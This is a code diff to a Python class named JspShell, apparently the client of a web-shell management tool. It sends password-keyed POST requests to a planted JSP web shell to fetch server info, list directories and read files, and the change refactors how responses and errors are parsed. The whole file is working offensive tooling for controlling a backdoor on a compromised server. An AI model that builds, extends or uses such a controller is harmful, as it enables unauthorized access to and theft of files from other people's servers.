@@ -36,22 +36,26 @@ class JspShell:
         self.httpHeaders={'User-Agent': self.httpSettingEntity.user_agent,'Cookie':self.httpSettingEntity.cookie}
 
     def parseResponse(self,response):
-        if config.SPLIT_SYMBOL_LEFT in response and config.SPLIT_SYMBOL_RIGHT in response:
-            return True,response[response.find(config.SPLIT_SYMBOL_LEFT)+len(config.SPLIT_SYMBOL_LEFT):response.find(config.SPLIT_SYMBOL_RIGHT)]
+        responseText=response.text
+        if config.SPLIT_SYMBOL_LEFT in responseText and config.SPLIT_SYMBOL_RIGHT in responseText:
+            resultText=responseText[responseText.find(config.SPLIT_SYMBOL_LEFT)+len(config.SPLIT_SYMBOL_LEFT):responseText.find(config.SPLIT_SYMBOL_RIGHT)]
+            if config.ERROR_LABEL in resultText:
+                return False,resultText
+            return True,resultText
         else:
-            return False,response
+            return False,response.status_code
 
     def getStart(self):
         payload = {self.shellEntity.shell_password: 'A','z0':self.shellEntity.shell_encode_type}
-        r=requests.post(self.shellEntity.shell_address,headers=self.httpHeaders,data=payload)
-        return self.parseResponse(r.text)
+        response=requests.post(self.shellEntity.shell_address,headers=self.httpHeaders,data=payload)
+        return self.parseResponse(response)
 
     def getDirectoryContent(self,path):
         payload = {self.shellEntity.shell_password: 'B','z1':path,'z0':self.shellEntity.shell_encode_type}
-        r = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
-        return self.parseResponse(r.text)
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+        return self.parseResponse(response)
 
     def getFileContent(self,path):
         payload = {self.shellEntity.shell_password: 'C', 'z1': path,'z0':self.shellEntity.shell_encode_type}
-        r = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
-        return self.parseResponse(r.text)
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+        return self.parseResponse(response)
